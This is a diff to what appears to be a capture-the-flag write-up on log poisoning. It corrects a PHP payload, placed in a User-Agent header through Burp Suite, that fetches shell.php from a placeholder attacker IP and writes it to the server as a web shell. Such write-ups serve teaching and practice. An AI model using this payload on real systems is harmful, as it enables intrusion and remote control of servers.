@@ -70,7 +70,7 @@ Not much information was gathered from here.
 
 After researching, we discover log poisoning as a potential attack vector. We decide to try this technique by using the User-Agent method to deliver our payload to the server. Using Burp Suite, we capture a request and modify its User-Agent header to contain our payload.
 
-`<?php file_put_contents('shell.php',file_get_contents('http://{}Attacker ip/shell.php')); ?>`
+`<?php file_put_contents('shell.php',file_get_contents('http://{Attacker ip}/shell.php')); ?>`
 
 ![image.png](image%209.png)
 
